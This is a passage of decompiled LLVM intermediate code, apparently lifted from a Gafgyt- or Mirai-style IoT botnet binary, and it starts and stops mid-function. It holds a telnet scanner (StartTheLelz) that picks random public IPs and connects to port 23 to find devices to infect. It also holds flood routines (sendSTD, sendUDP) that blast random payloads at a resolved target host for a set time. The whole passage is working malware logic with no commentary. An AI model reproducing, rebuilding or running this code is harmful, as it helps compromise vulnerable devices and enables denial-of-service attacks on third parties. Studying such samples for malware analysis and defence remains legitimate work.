dec_label_pc_10007d68:                            ; preds = %dec_label_pc_10007d54, %dec_label_pc_10007d24, %dec_label_pc_10007c84, %dec_label_pc_10007d60
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_10007c84 ], [ 0, %dec_label_pc_10007d24 ], [ 0, %dec_label_pc_10007d54 ], [ %v3_10007cec, %dec_label_pc_10007d60 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_10007ca8, { 1, 0 }
  uselistorder i32 %v3_10007ca0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10007d68, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007d88 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007d88, i32* %stack_var_-640, align 4
  store i32 268467644, i32* @lr, align 4
  %v1_10007db8 = call i32 @__GI_time(i32 0)
  %v0_10007dc4 = call i32 @rand_cmwc()
  %v2_10007dcc = xor i32 %v1_10007db8, %v0_10007dc4
  store i32 ptrtoint (i32* @global_var_10007dd8.251 to i32), i32* @lr, align 4
  %v1_10007dd4 = call i32 @srand(i32 %v2_10007dcc)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10007de4 = call i32 @htons(i32 23)
  %v2_10007df4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10007df4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 513, i32* @r3, align 4
  store i32 268467728, i32* @lr, align 4
  %v0_10007e0c = call i32 @malloc()
  store i32 513, i32* %r9.global-to-local, align 4
  store i32 268467760, i32* @lr, align 4
  %v3_10007e2c = call i32 @__GI_memset(i32 %v0_10007e0c, i32 0, i32 513)
  %v1_10007e34 = mul i32 %arg2, 28
  %v1_10007e3c = add i32 %v1_10007e34, 30
  %v1_10007e40 = and i32 %v1_10007e3c, -16
  %v2_10007e48 = load i32, i32* %stack_var_-640, align 4
  %v1_10007e50 = load i32, i32* @r1, align 4
  %v3_10007e50 = sub i32 %v1_10007e50, %v1_10007e40
  %v4_10007e50 = inttoptr i32 %v3_10007e50 to i32*
  store i32 %v2_10007e48, i32* %v4_10007e50, align 4
  %v1_10007e60 = add i32 %v3_10007e50, 23
  %v1_10007e64 = and i32 %v1_10007e60, -16
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  %v1_10007e80 = mul i32 %arg2, 5
  store i32 ptrtoint (i32* @global_var_10007e94.252 to i32), i32* @lr, align 4
  %v3_10007e90 = call i32 @__GI_memset(i32 %v1_10007e64, i32 0, i32 %v1_10007e80)
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10007f3010 = icmp sgt i32 %arg2, 0
  br i1 %v2_10007f3010, label %dec_label_pc_10007ea0, label %dec_label_pc_10007f38

dec_label_pc_10007ea0:                            ; preds = %entry, %dec_label_pc_10007ea0
  %storemerge313 = phi i32 [ %v1_10007f20, %dec_label_pc_10007ea0 ], [ 0, %entry ]
  %v1_10007ea8 = mul i32 %storemerge313, 28
  %v2_10007eac = add i32 %v1_10007ea8, %v1_10007e64
  store i32 %v2_10007eac, i32* %r9.global-to-local, align 4
  %v2_10007eb4 = inttoptr i32 %v2_10007eac to i32*
  store i32 0, i32* %v2_10007eb4, align 4
  %v1_10007ebc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ebc = add i32 %v1_10007ebc, 4
  %v3_10007ebc = inttoptr i32 %v2_10007ebc to i32*
  store i32 0, i32* %v3_10007ebc, align 4
  %v1_10007ec4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ec4 = add i32 %v1_10007ec4, 8
  %v3_10007ec4 = inttoptr i32 %v2_10007ec4 to i32*
  store i32 0, i32* %v3_10007ec4, align 4
  %v1_10007ecc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ecc = add i32 %v1_10007ecc, 12
  %v3_10007ecc = inttoptr i32 %v2_10007ecc to i32*
  store i32 0, i32* %v3_10007ecc, align 4
  %v1_10007ed4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ed4 = add i32 %v1_10007ed4, 16
  %v3_10007ed4 = inttoptr i32 %v2_10007ed4 to i32*
  store i32 0, i32* %v3_10007ed4, align 4
  %v1_10007edc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007edc = add i32 %v1_10007edc, 20
  %v3_10007edc = inttoptr i32 %v2_10007edc to i32*
  store i32 0, i32* %v3_10007edc, align 4
  %v1_10007ee4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ee4 = add i32 %v1_10007ee4, 24
  %v3_10007ee4 = inttoptr i32 %v2_10007ee4 to i32*
  store i32 0, i32* %v3_10007ee4, align 4
  %v3_10007efc = add i32 %v2_10007eac, 9
  %v4_10007efc = inttoptr i32 %v3_10007efc to i8*
  store i8 1, i8* %v4_10007efc, align 1
  %v1_10007f10 = add i32 %v2_10007eac, 24
  %v2_10007f18 = inttoptr i32 %v1_10007f10 to i32*
  store i32 %v0_10007e0c, i32* %v2_10007f18, align 4
  %v1_10007f20 = add nuw nsw i32 %storemerge313, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10007f30 = icmp slt i32 %v1_10007f20, %arg2
  br i1 %v2_10007f30, label %dec_label_pc_10007ea0, label %dec_label_pc_10007f38

dec_label_pc_10007f38:                            ; preds = %dec_label_pc_10007ea0, %entry
  br label %dec_label_pc_10007f40

dec_label_pc_10007f40:                            ; preds = %dec_label_pc_10007f40, %dec_label_pc_10007f38
  %stack_var_-604.0 = phi i32 [ 0, %dec_label_pc_10007f38 ], [ %v1_10007f44, %dec_label_pc_10007f40 ]
  %v1_10007f44 = add i32 %stack_var_-604.0, 1
  %v1_10007f58 = mul i32 %v1_10007f44, 4
  %v2_10007f5c = add i32 %v1_10007f58, ptrtoint ([10 x i8*]* @global_var_1002819c.263 to i32)
  store i32 %v2_10007f5c, i32* %r9.global-to-local, align 4
  %v1_10007f60 = inttoptr i32 %v2_10007f5c to i32*
  %v2_10007f60 = load i32, i32* %v1_10007f60, align 4
  %v3_10007f64 = icmp eq i32 %v2_10007f60, 0
  br i1 %v3_10007f64, label %dec_label_pc_10007f6c.preheader, label %dec_label_pc_10007f40

dec_label_pc_10007f6c.preheader:                  ; preds = %dec_label_pc_10007f40
  %v2_10007fb4 = add i32 %v1_10007e64, 16
  %v2_100080c8 = or i32 %v1_10007e64, 4
  %v2_100082d0 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_10007f6c

dec_label_pc_10007f6c:                            ; preds = %dec_label_pc_10007f6c, %dec_label_pc_10008d9c, %dec_label_pc_10007f6c.preheader
  store i32 %arg2, i32* %r9.global-to-local, align 4
  br i1 %v2_10007f3010, label %dec_label_pc_10007f78, label %dec_label_pc_10007f6c

dec_label_pc_10007f78:                            ; preds = %dec_label_pc_10007f6c, %dec_label_pc_10008d9c
  %storemerge48 = phi i32 [ %v1_10008da0, %dec_label_pc_10008d9c ], [ 0, %dec_label_pc_10007f6c ]
  %v1_10007f80 = mul i32 %storemerge48, 28
  %v2_10007f84 = add i32 %v1_10007f80, %v1_10007e64
  %v1_10007f88 = add i32 %v2_10007f84, 16
  store i32 %v1_10007f88, i32* %r9.global-to-local, align 4
  %v1_10007f8c = inttoptr i32 %v1_10007f88 to i32*
  %v2_10007f8c = load i32, i32* %v1_10007f8c, align 4
  %v3_10007f90 = icmp eq i32 %v2_10007f8c, 0
  br i1 %v3_10007f90, label %dec_label_pc_10007f98, label %dec_label_pc_10007fc0

dec_label_pc_10007f98:                            ; preds = %dec_label_pc_10007f78
  store i32 268468132, i32* @lr, align 4
  %v1_10007fa0 = call i32 @__GI_time(i32 0)
  %v1_10007fb0 = mul i32 %storemerge48, 28
  %v1_10007fb8 = add i32 %v2_10007fb4, %v1_10007fb0
  store i32 %v1_10007fb8, i32* %r9.global-to-local, align 4
  %v2_10007fbc = inttoptr i32 %v1_10007fb8 to i32*
  store i32 %v1_10007fa0, i32* %v2_10007fbc, align 4
  br label %dec_label_pc_10007fc0

dec_label_pc_10007fc0:                            ; preds = %dec_label_pc_10007f78, %dec_label_pc_10007f98
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10007fd0 = add i32 %v2_10007f84, 8
  %v2_10007fd0 = inttoptr i32 %v1_10007fd0 to i8*
  %v3_10007fd0 = load i8, i8* %v2_10007fd0, align 4
  %v2_10007fe0 = icmp ugt i8 %v3_10007fd0, 7
  br i1 %v2_10007fe0, label %dec_label_pc_10008d9c, label %dec_label_pc_10007fe8

dec_label_pc_10007fe8:                            ; preds = %dec_label_pc_10007fc0
  %v4_10007fd0 = zext i8 %v3_10007fd0 to i32
  %v1_10007fec = mul nuw nsw i32 %v4_10007fd0, 4
  %v2_10007ff8 = add i32 %v1_10007fec, ptrtoint (i32* @global_var_10015cd4.264 to i32)
  store i32 %v2_10007ff8, i32* %r9.global-to-local, align 4
  %v1_10007ffc = inttoptr i32 %v2_10007ff8 to i32*
  %v2_10007ffc = load i32, i32* %v1_10007ffc, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_10008008 = add i32 %v2_10007ffc, ptrtoint (i32* @global_var_10015cd4.264 to i32)
  call void @__pseudo_branch(i32 %v2_10008008)
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008024 = add i32 %v2_10007f84, 9
  %v2_10008024 = inttoptr i32 %v1_10008024 to i8*
  %v3_10008024 = load i8, i8* %v2_10008024, align 1
  %v3_1000802c = icmp eq i8 %v3_10008024, 1
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  br i1 %v3_1000802c, label %dec_label_pc_10008034, label %dec_label_pc_100080d8

dec_label_pc_10008034:                            ; preds = %dec_label_pc_10007fe8
  %v1_10008044 = add i32 %v2_10007f84, 24
  store i32 %v1_10008044, i32* %r9.global-to-local, align 4
  %v1_10008048 = inttoptr i32 %v1_10008044 to i32*
  %v2_10008048 = load i32, i32* %v1_10008048, align 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_10008064 = inttoptr i32 %v2_10007f84 to i32*
  store i32 0, i32* %v2_10008064, align 4
  %v1_1000806c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000806c = add i32 %v1_1000806c, 4
  %v3_1000806c = inttoptr i32 %v2_1000806c to i32*
  store i32 0, i32* %v3_1000806c, align 4
  %v1_10008074 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008074 = add i32 %v1_10008074, 8
  %v3_10008074 = inttoptr i32 %v2_10008074 to i32*
  store i32 0, i32* %v3_10008074, align 4
  %v1_1000807c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000807c = add i32 %v1_1000807c, 12
  %v3_1000807c = inttoptr i32 %v2_1000807c to i32*
  store i32 0, i32* %v3_1000807c, align 4
  %v1_10008084 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008084 = add i32 %v1_10008084, 16
  %v3_10008084 = inttoptr i32 %v2_10008084 to i32*
  store i32 0, i32* %v3_10008084, align 4
  %v1_1000808c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000808c = add i32 %v1_1000808c, 20
  %v3_1000808c = inttoptr i32 %v2_1000808c to i32*
  store i32 0, i32* %v3_1000808c, align 4
  %v1_10008094 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008094 = add i32 %v1_10008094, 24
  %v3_10008094 = inttoptr i32 %v2_10008094 to i32*
  store i32 0, i32* %v3_10008094, align 4
  store i32 %v1_10008044, i32* %r9.global-to-local, align 4
  store i32 %v2_10008048, i32* %v1_10008048, align 4
  %v1_100080b8 = call i32 @GetRandomPublicIP(i32 %v1_10008044)
  %v0_100080c4 = load i32, i32* @r29, align 4
  %v1_100080c4 = mul i32 %v0_100080c4, 28
  %v1_100080cc = add i32 %v1_100080c4, %v2_100080c8
  store i32 %v1_100080cc, i32* %r9.global-to-local, align 4
  %v2_100080d0 = inttoptr i32 %v1_100080cc to i32*
  store i32 %v1_100080b8, i32* %v2_100080d0, align 4
  br label %dec_label_pc_100081d0

dec_label_pc_100080d8:                            ; preds = %dec_label_pc_10007fe8
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v3_100080e8 = load i8, i8* %v2_10008024, align 1
  %v3_100080f0 = icmp eq i8 %v3_100080e8, 0
  br i1 %v3_100080f0, label %dec_label_pc_100080f8, label %dec_label_pc_100081d0

dec_label_pc_100080f8:                            ; preds = %dec_label_pc_100080d8
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008108 = add i32 %v2_10007f84, 11
  %v2_10008108 = inttoptr i32 %v1_10008108 to i8*
  %v3_10008108 = load i8, i8* %v2_10008108, align 1
  %v1_10008110 = add i8 %v3_10008108, 1
  store i8 %v1_10008110, i8* %v2_10008108, align 1
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008138 = add i32 %v2_10007f84, 10
  %v2_10008138 = inttoptr i32 %v1_10008138 to i8*
  %v3_10008138 = load i8, i8* %v2_10008138, align 2
  %v1_10008140 = add i8 %v3_10008138, 1
  store i8 %v1_10008140, i8* %v2_10008138, align 2
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v3_10008168 = load i8, i8* %v2_10008108, align 1
  %v3_10008170 = icmp eq i8 %v3_10008168, 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  br i1 %v3_10008170, label %dec_label_pc_10008178, label %dec_label_pc_10008194

dec_label_pc_10008178:                            ; preds = %dec_label_pc_100080f8
  store i8 1, i8* %v2_10008024, align 1
  br label %dec_label_pc_10008d9c

dec_label_pc_10008194:                            ; preds = %dec_label_pc_100080f8
  %v3_100081a4 = load i8, i8* %v2_10008138, align 2
  %v3_100081ac = icmp eq i8 %v3_100081a4, 4
  br i1 %v3_100081ac, label %dec_label_pc_100081b4, label %dec_label_pc_100081d0

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_10008194
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008024, align 1
  br label %dec_label_pc_10008d9c

dec_label_pc_100081d0:                            ; preds = %dec_label_pc_10008194, %dec_label_pc_100080d8, %dec_label_pc_10008034
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_100081dc = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-52, align 4
  %v1_10008210 = add i32 %v2_10007f84, 4
  store i32 %v1_10008210, i32* %r9.global-to-local, align 4
  store i32 268468784, i32* @lr, align 4
  %v3_1000822c = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10008238 = mul i32 %storemerge48, 28
  %v2_1000823c = add i32 %v1_10008238, %v1_10007e64
  %v2_10008240 = inttoptr i32 %v2_1000823c to i32*
  store i32 %v3_1000822c, i32* %v2_10008240, align 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008254 = inttoptr i32 %v2_10007f84 to i32*
  %v2_10008254 = load i32, i32* %v1_10008254, align 4
  store i32 %v2_10008254, i32* %r9.global-to-local, align 4
  %v4_1000825c = icmp eq i32 %v2_10008254, -1
  br i1 %v4_1000825c, label %dec_label_pc_10008d9c, label %dec_label_pc_10008264

dec_label_pc_10008264:                            ; preds = %dec_label_pc_100081d0
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_10008274 = load i32, i32* %v1_10008254, align 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_10008288 = load i32, i32* %v1_10008254, align 4
  store i32 268468896, i32* @lr, align 4
  %v2_1000829c = call i32 @__libc_fcntl(i32 %v2_10008288, i32 3)
  store i32 268468924, i32* @lr, align 4
  %v2_100082b8 = call i32 @__libc_fcntl(i32 %v2_10008274, i32 4)
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_100082cc = load i32, i32* %v1_10008254, align 4
  store i32 %v2_100082d0, i32* %r9.global-to-local, align 4
  store i32 268468964, i32* @lr, align 4
  %v3_100082e0 = call i32 @__libc_connect(i32 %v2_100082cc, i32 %v2_100082d0, i32 16)
  store i32 %v3_100082e0, i32* %r9.global-to-local, align 4
  %v4_100082ec = icmp eq i32 %v3_100082e0, -1
  br i1 %v4_100082ec, label %dec_label_pc_100082f4, label %dec_label_pc_10008324

dec_label_pc_100082f4:                            ; preds = %dec_label_pc_10008264
  %v0_100082f4 = call i32 @__errno_location()
  store i32 %v0_100082f4, i32* %r9.global-to-local, align 4
  %v1_100082fc = inttoptr i32 %v0_100082f4 to i32*
  %v2_100082fc = load i32, i32* %v1_100082fc, align 4
  %v3_10008300 = icmp eq i32 %v2_100082fc, 115
  br i1 %v3_10008300, label %dec_label_pc_10008324, label %dec_label_pc_10008308

dec_label_pc_10008308:                            ; preds = %dec_label_pc_100082f4
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008320.265 to i32), i32* @lr, align 4
  %v2_1000831c = call i32 @reset_telstate(i32 %v2_10007f84, i32 %v1_10007e64)
  br label %dec_label_pc_10008d9c

dec_label_pc_10008324:                            ; preds = %dec_label_pc_10008264, %dec_label_pc_100082f4
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  %v3_1000833c = call i32 @advance_state(i32* nonnull %v1_10008254, i32 1)
  br label %dec_label_pc_10008d9c

dec_label_pc_10008d9c:                            ; preds = %dec_label_pc_100081d0, %dec_label_pc_10007fc0, %dec_label_pc_10008324, %dec_label_pc_10008308, %dec_label_pc_100081b4, %dec_label_pc_10008178
  %v1_10008da0 = add nuw nsw i32 %storemerge48, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10008db0 = icmp slt i32 %v1_10008da0, %arg2
  br i1 %v2_10008db0, label %dec_label_pc_10007f78, label %dec_label_pc_10007f6c

; uselistorder directives
  uselistorder i32 %v1_10008da0, { 1, 0 }
  uselistorder i8* %v2_10008138, { 1, 0, 2 }
  uselistorder i8* %v2_10008108, { 1, 0, 2 }
  uselistorder i32 %v1_10008044, { 1, 0, 2, 3 }
  uselistorder i8 %v3_10007fd0, { 1, 0 }
  uselistorder i32 %v2_10007f84, { 7, 8, 9, 10, 12, 11, 13, 0, 1, 2, 4, 3, 6, 5, 17, 15, 14, 16, 19, 18, 21, 20, 22 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_10007f20, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_10007e64, { 6, 5, 4, 0, 7, 1, 3, 8, 2, 9, 10 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 33, 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 48, 28, 29, 30, 31, 32, 46, 34, 42, 35, 36, 37, 38, 39, 40, 41, 47, 43, 44, 45 }
  uselistorder i32 %arg2, { 4, 3, 2, 6, 5, 0, 1, 7, 8 }
  uselistorder label %dec_label_pc_10008d9c, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_10008324, { 1, 0 }
  uselistorder label %dec_label_pc_10007fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10007f78, { 1, 0 }
  uselistorder label %dec_label_pc_10007f6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007ea0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268471788, i32* @lr, align 4
  %v3_10008de8 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268471804, i32* @lr, align 4
  %v1_10008df8 = call i32 @__GI_time(i32 0)
  store i32 268471824, i32* @lr, align 4
  %v1_10008e0c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10008e18 = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_10008e40 = add i32 %v1_10008e0c, 16
  %v2_10008e40 = inttoptr i32 %v1_10008e40 to i32*
  %v3_10008e40 = load i32, i32* %v2_10008e40, align 4
  %v1_10008e44 = inttoptr i32 %v3_10008e40 to i32*
  %v2_10008e44 = load i32, i32* %v1_10008e44, align 4
  %v2_10008e4c = ptrtoint i32* %stack_var_-192 to i32
  %v1_10008e54 = add i32 %v1_10008e0c, 12
  %v2_10008e54 = inttoptr i32 %v1_10008e54 to i32*
  %v3_10008e54 = load i32, i32* %v2_10008e54, align 4
  store i32 %v3_10008e54, i32* @r5, align 4
  store i32 268471912, i32* @lr, align 4
  %v4_10008e64 = call i32 @bcopy(i32 %v2_10008e44, i32 %v2_10008e4c, i32 %v3_10008e54, i32 %v1_10008e0c)
  %v1_10008e6c = add i32 %v1_10008e0c, 8
  %v2_10008e6c = inttoptr i32 %v1_10008e6c to i32*
  %v3_10008e6c = load i32, i32* %v2_10008e6c, align 4
  %v1_10008e70 = urem i32 %v3_10008e6c, 65536
  store i32 %v1_10008e70, i32* %stack_var_-196, align 4
  %v2_10008e94 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10008ee4 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10008ee8 = add i32 %v2_10008ee4, 36
  %v2_10008f40 = add i32 %v1_10008df8, %arg3
  br label %dec_label_pc_10008e8c

dec_label_pc_10008e8c:                            ; preds = %dec_label_pc_10008f64, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_10008f68, %dec_label_pc_10008f64 ]
  store i32 %v2_10008e94, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_10015e98.348 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10008eac.349 to i32), i32* @lr, align 4
  %v0_10008ea8 = call i32 @memcpy()
  store i32 268471984, i32* @lr, align 4
  %v0_10008eac = call i32 @random()
  %v1_10008ec4 = urem i32 %v0_10008eac, 36
  %v1_10008ee0 = mul nuw nsw i32 %v1_10008ec4, 4
  %v1_10008eec = add i32 %v2_10008ee8, %v1_10008ee0
  %v1_10008ef0 = inttoptr i32 %v1_10008eec to i32*
  %v2_10008ef0 = load i32, i32* %v1_10008ef0, align 4
  store i32 %v2_10008ef0, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_10008f64, label %dec_label_pc_10008f04

dec_label_pc_10008f04:                            ; preds = %dec_label_pc_10008e8c
  store i32 268472088, i32* @lr, align 4
  %v4_10008f14 = call i32 @__libc_send(i32 %v3_10008de8, i32 %v2_10008ef0, i32 65, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10008f2c.350 to i32), i32* @lr, align 4
  %v3_10008f28 = call i32 @__libc_connect(i32 %v3_10008de8, i32 %v2_10008e18, i32 16)
  store i32 268472116, i32* @lr, align 4
  %v1_10008f30 = call i32 @__GI_time(i32 0)
  %v2_10008f44 = icmp slt i32 %v1_10008f30, %v2_10008f40
  br i1 %v2_10008f44, label %dec_label_pc_10008f5c, label %dec_label_pc_10008f4c

dec_label_pc_10008f4c:                            ; preds = %dec_label_pc_10008f04
  store i32 ptrtoint ([3 x i8]* @global_var_10008f54.351 to i32), i32* @lr, align 4
  %v1_10008f50 = call i32 @__libc_close(i32 %v3_10008de8)
  %v1_10008f58 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008f5c

dec_label_pc_10008f5c:                            ; preds = %dec_label_pc_10008f04, %dec_label_pc_10008f4c
  br label %dec_label_pc_10008f64

dec_label_pc_10008f64:                            ; preds = %dec_label_pc_10008e8c, %dec_label_pc_10008f5c
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_10008e8c ], [ 0, %dec_label_pc_10008f5c ]
  %v1_10008f68 = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_10008e8c

; uselistorder directives
  uselistorder i32 %v3_10008e54, { 1, 0 }
  uselistorder i32 %v1_10008e0c, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_10008f64, { 1, 0 }
  uselistorder label %dec_label_pc_10008f5c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008f74 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008f74, i32* %stack_var_-160, align 4
  %v0_10008fa8 = load i32, i32* @r10, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v3_10008fb8 = icmp eq i32 %arg2, 0
  br i1 %v3_10008fb8, label %dec_label_pc_10008fc0, label %dec_label_pc_10008fd4

dec_label_pc_10008fc0:                            ; preds = %entry
  %v0_10008fc0 = call i32 @rand_cmwc()
  br label %dec_label_pc_10008fec

dec_label_pc_10008fd4:                            ; preds = %entry
  %v1_10008fd8 = urem i32 %arg2, 65536
  store i32 %v1_10008fd8, i32* @r3, align 4
  %v1_10008fe0 = call i32 @htons(i32 %v1_10008fd8)
  br label %dec_label_pc_10008fec

dec_label_pc_10008fec:                            ; preds = %dec_label_pc_10008fc0, %dec_label_pc_10008fd4
  %v2_10008fec = ptrtoint i32* %stack_var_-112 to i32
  %v4_10008ffc = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-108, i32 %v2_10008fec)
  %v3_10009004 = icmp eq i32 %v4_10008ffc, 0
  br i1 %v3_10009004, label %dec_label_pc_1000900c, label %dec_label_pc_100095d8

dec_label_pc_1000900c:                            ; preds = %dec_label_pc_10008fec
  %v3_10009030 = icmp eq i32 %arg4, 32
  br i1 %v3_10009030, label %dec_label_pc_10009038, label %dec_label_pc_100091b4

dec_label_pc_10009038:                            ; preds = %dec_label_pc_1000900c
  store i32 268472392, i32* @lr, align 4
  %v3_10009044 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10009054 = icmp eq i32 %v3_10009044, 0
  br i1 %v3_10009054, label %dec_label_pc_1000905c, label %dec_label_pc_1000907c

dec_label_pc_1000905c:                            ; preds = %dec_label_pc_10009038
  %v3_10009060 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_10009078.354 to i32), i32* @lr, align 4
  %v4_10009074 = call i32 @sockprintf(i32 %v3_10009060, i32 ptrtoint ([27 x i8]* @global_var_10015f28.353 to i32), i32 268500992)
  br label %dec_label_pc_100095d8

dec_label_pc_1000907c:                            ; preds = %dec_label_pc_10009038
  %v1_10009080 = add i32 %arg5, 1
  store i32 %v1_10009080, i32* @r3, align 4
  store i32 268472460, i32* @lr, align 4
  %v0_10009088 = call i32 @malloc()
  %v3_10009098 = icmp eq i32 %v0_10009088, 0
  br i1 %v3_10009098, label %dec_label_pc_100095d8, label %dec_label_pc_100090a0

dec_label_pc_100090a0:                            ; preds = %dec_label_pc_1000907c
  store i32 268472512, i32* @lr, align 4
  %v3_100090bc = call i32 @__GI_memset(i32 %v0_10009088, i32 0, i32 %v1_10009080)
  %v2_100090c8 = call i32 @makeRandomStr(i32 %v0_10009088, i32 %arg5)
  store i32 268472532, i32* @lr, align 4
  %v1_100090d0 = call i32 @__GI_time(i32 0)
  %v2_100090dc = add i32 %v1_100090d0, %arg3
  %v1_1000918c = mul i32 %v0_10008fa8, 1000
  br label %dec_label_pc_100090f8.outer

dec_label_pc_100090f8.outer:                      ; preds = %dec_label_pc_100090f8.outer.backedge, %dec_label_pc_100090a0
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_100090a0 ], [ %storemerge27, %dec_label_pc_100090f8.outer.backedge ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_100090a0 ], [ %v1_10009170, %dec_label_pc_100090f8.outer.backedge ]
  br label %dec_label_pc_100090f8

dec_label_pc_100090f8:                            ; preds = %dec_label_pc_100090f8.outer, %dec_label_pc_10009160
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10009160 ], [ %stack_var_-44.0.ph, %dec_label_pc_100090f8.outer ]
  store i32 268472604, i32* @lr, align 4
  %v7_10009118 = call i32 @__libc_sendto(i32 %v3_10009044, i32 %v0_10009088, i32 %arg5, i32 0, i32 %v2_10008fec, i32 16, i32 %v2_10008fec)
  %v4_10009124 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10009124, label %dec_label_pc_1000912c, label %dec_label_pc_1000916c

dec_label_pc_1000912c:                            ; preds = %dec_label_pc_100090f8
  br i1 %v3_10008fb8, label %dec_label_pc_10009138, label %dec_label_pc_10009148

dec_label_pc_10009138:                            ; preds = %dec_label_pc_1000912c
  %v0_10009138 = call i32 @rand_cmwc()
  br label %dec_label_pc_10009148

dec_label_pc_10009148:                            ; preds = %dec_label_pc_1000912c, %dec_label_pc_10009138
  store i32 268472656, i32* @lr, align 4
